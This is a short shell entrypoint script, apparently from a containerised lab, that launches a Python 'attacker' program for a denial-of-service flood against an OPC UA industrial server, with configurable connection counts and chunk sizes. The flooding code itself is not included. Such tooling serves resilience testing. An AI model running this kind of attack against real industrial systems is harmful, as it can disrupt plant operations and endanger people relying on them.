#!/bin/sh
set -eu

# Configurable via env
HOST=${HOST:-opcua-server}
PORT=${PORT:-4840}
CONNECTIONS=${CONNECTIONS:-1}
CHUNK_SIZE=${CHUNK_SIZE:-1048576}
SLEEP_BETWEEN=${SLEEP_BETWEEN:-0}
LOG_EVERY=${LOG_EVERY:-100}

echo "Starting DoS attack against ${HOST}:${PORT} (connections=${CONNECTIONS}, chunk_size=${CHUNK_SIZE}, sleep_between=${SLEEP_BETWEEN})"

exec python -u app/attacker.py \
  --host "$HOST" \
  --port "$PORT" \
  --connections "$CONNECTIONS" \
  --chunk-size "$CHUNK_SIZE" \
  --sleep-between "$SLEEP_BETWEEN" \
  --log-every "$LOG_EVERY"
